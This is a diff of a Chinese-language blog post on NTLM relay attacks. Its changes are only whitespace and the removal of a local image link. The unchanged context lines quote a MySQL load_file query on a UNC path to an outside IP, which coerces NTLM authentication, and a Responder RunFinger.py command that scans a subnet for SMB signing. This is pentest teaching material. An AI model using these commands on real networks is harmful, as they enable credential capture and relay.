@@ -2,6 +2,7 @@
 title: "NTLM Relay专题"
 date: 2025-12-11T00:00:00+08:00
 draft: false
+
 ---
 
 # NTLM Relay专题
@@ -114,6 +115,7 @@ Windows的MS-RPRN协议用于打印客户机和打印服务器之间的通信，
 ##### sql注入
 
 windows上安装的mysql中1，load_file、into dumpfile等常见函数同样支持UNC路径：
+
 ~~~mysql
 select load_file('\\\\192.168.111.130\\file')
 # 唯一有变化的是这里的\要用\\来转义一下
@@ -180,8 +182,6 @@ responder有内置工具用于扫描内网主机SMB签名情况：
 ~~~shell
 python RunFinger.py -i 192.168.111.0/24 
 ~~~
-
-![image-20250119162531852](C:\Users\煜阳\AppData\Roaming\Typora\typora-user-images\image-20250119162531852.png)
 
 #### 域环境下的利用
 
